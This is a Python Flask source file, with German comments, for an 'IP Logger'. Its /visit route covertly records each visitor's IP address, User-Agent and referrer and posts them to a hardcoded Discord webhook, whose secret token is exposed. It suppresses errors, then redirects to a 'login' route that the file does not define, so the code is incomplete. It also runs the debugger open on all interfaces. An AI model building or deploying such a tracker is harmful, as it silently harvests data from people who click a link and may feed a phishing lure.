from flask import Flask, request, render_template_string, redirect, url_for
import os
import time
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1528134819182018744/nmVP6bDv57X4IKd-Gku8QMSA94ji4JryxAdX58gtmFVul6lDPd7eKMLR7vb6RJYWEue4"

def get_client_ip(request):
    # Alle möglichen Header durchgehen
    headers = [
        'X-Forwarded-For',
        'X-Real-IP',
        'CF-Connecting-IP',
        'True-Client-IP'
    ]
    for header in headers:
        value = request.headers.get(header)
        if value:
            ip = value.split(',')[0].strip()
            if ip and not ip.startswith(('10.', '172.16.', '192.168.', '127.')):
                return ip
    return request.remote_addr or 'Unknown'

@app.route('/visit')
def log_ip():
    ip = get_client_ip(request)
    
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        ips = [x.strip() for x in forwarded.split(',')]
        ip = ips[0]
    
    if not ip or ip.startswith('10.') or ip.startswith('172.16.') or ip.startswith('192.168.') or ip == '127.0.0.1':
        ip = request.remote_addr or 'Unknown'
    
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'None')
    
    payload = {
        "content": f"🌐 **Neuer Besucher**\n**IP:** `{ip}`",
        "embeds": [{
            "title": "IP Logger",
            "color": 16711680,
            "fields": [
                {"name": "IP", "value": f"`{ip}`", "inline": True},
                {"name": "User-Agent", "value": f"`{user_agent[:300]}`", "inline": False},
                {"name": "Referrer", "value": f"`{referrer}`", "inline": False},
            ]
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=15)
    except Exception as e:
        pass  # Silent fail

    time.sleep(3)
    
    return redirect(url_for("login"))


if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
